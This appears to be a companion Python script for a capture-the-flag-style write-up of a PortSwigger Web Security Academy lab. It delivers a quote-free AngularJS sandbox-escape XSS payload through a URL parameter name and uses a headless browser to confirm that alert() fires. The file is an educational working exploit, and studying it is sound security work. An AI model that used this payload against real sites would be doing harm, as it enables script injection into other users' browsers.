#!/usr/bin/env python3
"""
Reflected XSS with AngularJS sandbox escape without strings
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 25-angularjs-sandbox-escape-without-strings.md

What this does:
    The application reflects every URL parameter NAME (not value) into an
    Angular $parse() call, and quote characters in the expression are
    stripped/blocked, ruling out the usual constructor.constructor('...')-style
    string-literal sandbox escapes. This payload builds a string without ever
    writing a quote: toString() has no quote requirement, so
    String.prototype.charAt is overwritten with [].join (neutralizing the
    sandbox's own charAt-based content inspection), then [1]|orderBy: pipes an
    array through the orderBy filter whose argument is built via
    toString().constructor.fromCharCode(...), decoding character codes into the
    literal text "x=alert(1)" with no quotes anywhere. The '=' inside
    charAt=[].join is percent-encoded (%3d) so it isn't parsed as a URL
    key/value separator, which would otherwise split the payload in half.

Usage:
    python 25-angularjs-sandbox-escape-without-strings.py <lab-url>
    e.g. python 25-angularjs-sandbox-escape-without-strings.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx playwright
    playwright install chromium
"""

import sys
import httpx

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    warmup = client.get(lab_url)
    session = warmup.cookies.get("session", "")
    domain = lab_url.split("/")[2]

    # The escape expression is delivered as a URL PARAMETER NAME, not a value.
    # fromCharCode(120,61,97,108,101,114,116,40,49,41) decodes to "x=alert(1)".
    url = (
        f"{lab_url}/?search=1&toString().constructor.prototype.charAt"
        "%3d[].join;[1]|orderBy:toString().constructor.fromCharCode"
        "(120,61,97,108,101,114,116,40,49,41)=1"
    )
    print(f"[*] Request: GET {url}")

    if sync_playwright is None:
        print("[!] playwright not installed -- cannot confirm alert() execution.")
        print(f"    Install it, or open this URL yourself: {url}")
        return

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(3000)
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() fired: {alert_fired}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
